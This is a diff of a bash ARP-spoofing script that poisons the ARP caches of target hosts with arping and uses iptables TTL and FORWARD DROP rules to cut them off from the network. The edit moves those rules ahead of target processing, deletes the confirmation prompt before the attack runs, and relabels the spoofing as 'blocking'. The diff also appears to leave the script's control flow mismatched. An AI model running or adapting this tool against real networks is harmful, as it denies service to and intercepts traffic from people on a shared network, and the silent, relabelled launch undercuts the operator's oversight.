@@ -1,5 +1,22 @@
 #!/bin/bash
 
+# Cleanup        
+cat > /bin/spoofer-stop << EOF
+#!/bin/bash                                                                                                              
+
+iptables -t mangle -I PREROUTING -i $INTERFACE -j TTL --ttl-set 64
+iptables -P FORWARD ACCEPT
+iptables -F FORWARD                                     
+pkill -f arping
+EOF                                     
+chmod 755 /bin/spoofer-stop                                                                                              
+
+# Iptables policy                                                                
+iptables -P FORWARD DROP
+iptables -I FORWARD -j DROP                                                                       
+
+# Drop hops                                                                      
+iptables -t mangle -I PREROUTING -i"$INTERFACE" -j TTL --ttl-set 0           
 
 # Function to auto-detect interface
 auto_detect_interface() {
@@ -152,10 +169,6 @@ if [[ -z "$TARGETS_INPUT" ]]; then
     exit 1
 fi
 
-# iptables policy
-iptables -P FORWARD DROP
-iptables -I FORWARD -j DROP
-
 # Process targets
 echo "Processing targets..."
 PROCESSED_TARGETS=$(process_targets "$TARGETS_INPUT" "$GATEWAY" "$DEVICE_IP" "$INTERFACE")
@@ -176,29 +189,10 @@ echo "  TARGET IP:  $target"
 done <<< "$PROCESSED_TARGETS"
 echo
 
-# Drop hops
-iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0
-
-# Cleanup
-cat > /bin/spoofer-stop << EOF
-#!/bin/bash
-
-iptables -t mangle -I PREROUTING -i $INTERFACE -j TTL --ttl-set 64
-iptables -P FORWARD ACCEPT
-iptables -F FORWARD
-EOF
-chmod 755 /bin/spoofer-stop
-
-# Confirm before executing
-read -rp "Execute spoofer? (y/N): " CONFIRM
-if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
-    echo "Starting ARP spoofing..."
-    echo "Press Ctrl+C to stop"
-
     # Loop through each target and perform ARP spoofing
     while IFS= read -r target; do
         if [[ -n "$target" ]]; then
-            echo "Spoofing target: $target"
+            echo "Blocking the target IP: $target"
             # Run arpspoof in background
             arping -b -A -i "$INTERFACE" -S "$target" "$GATEWAY" >/dev/null 2>&1 &
             arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 &
